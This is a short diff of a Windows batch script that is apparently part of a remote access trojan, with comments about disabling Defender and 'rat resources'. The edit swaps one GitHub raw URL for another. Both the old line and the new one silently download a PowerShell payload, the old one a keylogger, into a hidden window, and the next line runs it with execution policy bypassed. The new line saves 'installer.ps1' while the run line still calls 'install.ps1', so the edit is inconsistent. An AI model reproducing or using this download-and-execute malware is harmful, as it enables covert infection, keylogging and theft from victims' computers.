@@ -31,5 +31,5 @@ if '%errorlevel%' NEQ '0' (
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PrettyBoyCosmo/MK01-OnlyRAT/7fcc0b3ddbd87445f4b09ac4a6ef117a027f8973/resources/keylogger-pwsh/keylogger.ps1' -OutFile 'install.ps1'"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/entropyleech/rat-project/refs/heads/main/files/installer.ps1' -OutFile 'installer.ps1'"
 powershell Start-Process powershell.exe -windowstyle hidden -ep bypass "./install.ps1"
